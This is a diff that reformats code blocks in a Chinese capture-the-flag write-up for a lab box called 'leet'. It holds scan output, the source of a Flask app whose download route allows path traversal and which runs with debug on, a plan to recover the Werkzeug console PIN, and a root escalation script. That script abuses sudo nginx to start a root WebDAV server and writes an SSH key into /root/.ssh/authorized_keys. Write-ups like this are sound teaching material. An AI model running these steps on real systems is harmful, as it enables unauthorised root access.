@@ -9,13 +9,17 @@ description: " Linux 4.15 - 5.6 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) We
 #### [](#端口扫描 "端口扫描")端口扫描
 
 ```shell
-PORT     STATE SERVICE22/tcp   open  ssh7777/tcp open  cbt22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)| ssh-hostkey: |   256 e15d7cb7079217dc46767dbea95043d2 (ECDSA)|_  256 a0f3b38693f5588288dde510db35de62 (ED25519)7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)|_http-server-header: Werkzeug/3.0.1 Python/3.11.2|_http-title: Site doesn't have a title (text/html; charset=utf-8).MAC Address: 08:00:27:2B:F0:9A (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+PORT     STATE SERVICE22/tcp   open  ssh7777/tcp open  cbt22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)| ssh-hostkey: |   256 e15d7cb7079217dc46767dbea95043d2 (ECDSA)|_  256 a0f3b38693f5588288dde510db35de62 (ED25519)7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)|_http-server-header: Werkzeug/3.0.1 Python/3.11.2|_http-title: Site doesn't have a title (text/html;
+charset=utf-8).MAC Address: 08:00:27:2B:F0:9A (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6Network Distance: 1 hopService Info: OS: Linux;
+CPE: cpe:/o:linux:linux_kernel
 ```
 
 ##### [](#资产 "资产")资产
 
 ```shell
-/download             (Status: 500) [Size: 14478]/console              (Status: 200) [Size: 1563]
+/download             (Status: 500)
+[Size: 14478]/console              (Status: 200)
+[Size: 1563]
 ```
 
 Linux 4.15 - 5.6  
@@ -56,7 +60,100 @@ Flask 3.0.1
 第一个思路主要是想要拿到相关的敏感文件但是没想到下载还需要权限，因此跟一个文件读取差不多了，之后针对相关flask框架进行源码下载
 
 ```python
-from flask import Flask, request, send_file, abort, render_template_string  from werkzeug.exceptions import BadRequest  import os    app = Flask(__name__)  app.config['DEBUG'] = True    @app.route('/', methods=['GET', 'POST'])  def leet_converter():  if request.method == 'POST':  text = request.form['text']  leet_text = text.translate(str.maketrans("aeios", "43105"))  output_filename = "/tmp/converted_text.txt"  with open(output_filename, "w") as f:  f.write(leet_text)  return render_template_string('''  <!DOCTYPE html>  <html>  <head>  <title>L33T Convertor</title>  <style>  body { background-color: #333; color: #ddd; font-family: "Courier New", Courier, monospace; margin: 0; padding: 20px; }  .container { max-width: 600px; margin: auto; padding: 20px; background-color: #444; border-radius: 8px; }  h2 {  color: #eee;  text-align: center;  }    a, a:visited { color: #dcdcdc; text-decoration: underline; }  a:hover { color: #ffffff; }  form { display: flex; flex-direction: column; }  input[type="text"], input[type="submit"] { padding: 10px; margin-top: 10px; border-radius: 4px; border: 1px solid #555; background: #555; color: #ddd; }  input[type="submit"] { cursor: pointer; }  input[type="submit"]:hover { background: #666; }  </style>  </head>  <body>  <div class="container">  <h2>L33T converter</h2>  <form method="post">  <input type="text" name="text" placeholder="Type your text here">  <input type="submit" value="Convert to L33T">  </form>  {% if leet_text %}  <p>Résultat : {{ leet_text }}</p>  <a href="/download?filename=converted_text.txt">Download file text</a>  {% endif %}  </div>  </body>  </html>  ''', leet_text=leet_text)  else:  return render_template_string('''  <!DOCTYPE html>  <html>  <head>  <style>  body { background-color: #333; color: #ddd; font-family: "Courier New", Courier, monospace; margin: 0; padding: 20px; }  .container { max-width: 600px; margin: auto; padding: 20px; background-color: #444; border-radius: 8px; }  h2 { color: #eee; }  form { display: flex; flex-direction: column; }  input[type="text"], input[type="submit"] { padding: 10px; margin-top: 10px; border-radius: 4px; border: 1px solid #555; background: #555; color: #ddd; }  input[type="submit"] { cursor: pointer; }  input[type="submit"]:hover { background: #666; }  </style>  </head>  <body>  <div class="container">  <center><h2>L33T Converter</h2></center>  <form method="post">  <input type="text" name="text" placeholder="Type your text here">  <input type="submit" value="Convert to L33T">  </form>  </div>  </body>  </html>  ''')    @app.route('/download')  def download_file():  filename = request.args.get('filename')    if not filename or filename.startswith("/"):  raise ValueError("Parameter 'filename' invalid or missing.")    filepath = os.path.join("/tmp", filename)    try:  return send_file(filepath, as_attachment=True)  except Exception as e:  raise e    if __name__ == '__main__':  app.run(debug=True, host='0.0.0.0')
+from flask import Flask, request, send_file, abort, render_template_string  from werkzeug.exceptions import BadRequest  import os    app = Flask(__name__)
+app.config['DEBUG'] = True    @app.route('/', methods=['GET', 'POST'])
+def leet_converter():  if request.method == 'POST':  text = request.form['text']  leet_text = text.translate(str.maketrans("aeios", "43105"))
+output_filename = "/tmp/converted_text.txt"  with open(output_filename, "w")
+as f:  f.write(leet_text)
+return render_template_string('''  <!DOCTYPE html>  <html>  <head>  <title>L33T Convertor</title>  <style>  body {
+    background-color: #333;
+    color: #ddd;
+    font-family: "Courier New", Courier, monospace;
+    margin: 0;
+    padding: 20px;
+}
+.container {
+    max-width: 600px;
+    margin: auto;
+    padding: 20px;
+    background-color: #444;
+    border-radius: 8px;
+}
+h2 {
+    color: #eee;
+    text-align: center;
+}
+a, a:visited {
+    color: #dcdcdc;
+    text-decoration: underline;
+}
+a:hover {
+    color: #ffffff;
+}
+form {
+    display: flex;
+    flex-direction: column;
+}
+input[type="text"], input[type="submit"] {
+    padding: 10px;
+    margin-top: 10px;
+    border-radius: 4px;
+    border: 1px solid #555;
+    background: #555;
+    color: #ddd;
+}
+input[type="submit"] {
+    cursor: pointer;
+}
+input[type="submit"]:hover {
+    background: #666;
+}
+</style>  </head>  <body>  <div class="container">  <h2>L33T converter</h2>  <form method="post">  <input type="text" name="text" placeholder="Type your text here">  <input type="submit" value="Convert to L33T">  </form>  {% if leet_text %}
+<p>Résultat : {{
+    leet_text }}</p>  <a href="/download?filename=converted_text.txt">Download file text</a>  {% endif %}
+    </div>  </body>  </html>  ''', leet_text=leet_text)
+    else:  return render_template_string('''  <!DOCTYPE html>  <html>  <head>  <style>  body {
+        background-color: #333;
+        color: #ddd;
+        font-family: "Courier New", Courier, monospace;
+        margin: 0;
+        padding: 20px;
+    }
+    .container {
+        max-width: 600px;
+        margin: auto;
+        padding: 20px;
+        background-color: #444;
+        border-radius: 8px;
+    }
+    h2 {
+        color: #eee;
+    }
+    form {
+        display: flex;
+        flex-direction: column;
+    }
+    input[type="text"], input[type="submit"] {
+        padding: 10px;
+        margin-top: 10px;
+        border-radius: 4px;
+        border: 1px solid #555;
+        background: #555;
+        color: #ddd;
+    }
+    input[type="submit"] {
+        cursor: pointer;
+    }
+    input[type="submit"]:hover {
+        background: #666;
+    }
+    </style>  </head>  <body>  <div class="container">  <center><h2>L33T Converter</h2></center>  <form method="post">  <input type="text" name="text" placeholder="Type your text here">  <input type="submit" value="Convert to L33T">  </form>  </div>  </body>  </html>  ''')
+    @app.route('/download')
+    def download_file():  filename = request.args.get('filename')
+    if not filename or filename.startswith("/"):  raise ValueError("Parameter 'filename' invalid or missing.")
+    filepath = os.path.join("/tmp", filename)
+    try:  return send_file(filepath, as_attachment=True)
+    except Exception as e:  raise e    if __name__ == '__main__':  app.run(debug=True, host='0.0.0.0')
 ```
 
 冷静一下，整理一下思路。目前已经知道了对应的flask框架，并且还能够下载一些文件。此时应该能够联想到对应的一些flask的利用操作。console的pin值，如果说在信息足够的情况下，我们是可以拿到对应的pin值的。我们便可以使用console 来执行一些命令。直接getshell，一个非常常规的思路。
@@ -139,5 +236,11 @@ User riva may run the following commands on leet: (root) /usr/sbin/nginx
 参考大佬的脚本，直接将公钥传送进root中，再利用私钥登录。
 
 ```shell
-echo "[+] Creating configuration..."cat << EOF > /tmp/nginx_pwn.confuser root;worker_processes 4;pid /tmp/nginx.pid;events {        worker_connections 768;}http {	server {	        listen 1339;	        root /;	        autoindex on;	        dav_methods PUT;	}}EOFecho "[+] Loading configuration..."sudo nginx -c /tmp/nginx_pwn.confecho "[+] Generating SSH Key..."ssh-keygenecho "[+] Display SSH Private Key for copy..."cat .ssh/id_rsaecho "[+] Add key to root user..."curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"echo "[+] Use the SSH key to get access"
+echo "[+] Creating configuration..."cat << EOF > /tmp/nginx_pwn.confuser root;worker_processes 4;pid /tmp/nginx.pid;events {
+    worker_connections 768;}http {
+        server {
+            listen 1339;
+            root /;
+            autoindex on;
+            dav_methods PUT;	}}EOFecho "[+] Loading configuration..."sudo nginx -c /tmp/nginx_pwn.confecho "[+] Generating SSH Key..."ssh-keygenecho "[+] Display SSH Private Key for copy..."cat .ssh/id_rsaecho "[+] Add key to root user..."curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"echo "[+] Use the SSH key to get access"
 ```
